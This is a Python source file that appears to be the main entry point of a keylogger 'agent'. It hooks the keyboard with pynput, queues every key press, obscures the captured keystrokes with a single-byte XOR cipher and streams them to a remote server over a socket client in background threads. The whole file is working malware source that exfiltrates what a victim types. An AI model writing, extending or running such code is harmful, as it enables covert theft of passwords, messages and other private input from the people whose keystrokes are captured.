import queue
import sys
import threading

from engineio import Client
from pynput import keyboard

from agent import key_handler
from agent.print_credit import print_welcome
from agent.socket_client import init_socket, reconnect
from agent.worker import do_work
from shared.Encriptor import XorCharCipher

debug = 'debug' in sys.argv  # run with "python app.py debug" for local testing

cipher = XorCharCipher(77)
keystrokes_queue = queue.Queue()


def start_keyboard_listener():
    """Start listening to keyboard events"""
    listener = keyboard.Listener(on_press=lambda k: key_handler.on_key(k, keystrokes_queue))
    listener.start()
    listener.join()  # keep thread alive


def start_socket_client(sio: Client):
    """Start socket client and worker thread"""
    sio.on('connect', lambda: print('Connected to server'))

    # start worker thread
    threading.Thread(
        target=do_work,
        args=(sio, keystrokes_queue, cipher),
        daemon=True
    ).start()

    sio.wait()


def main():
    print_welcome()
    sio = None
    try:
        # Start keyboard listener in background
        threading.Thread(target=start_keyboard_listener, daemon=True).start()

        # Try to connect socket client
        sio = init_socket(debug)
        start_socket_client(sio)

    except KeyboardInterrupt:
        if sio and sio.connected:
            sio.disconnect()
        print("\n\nExiting...")


if __name__ == "__main__":
    main()
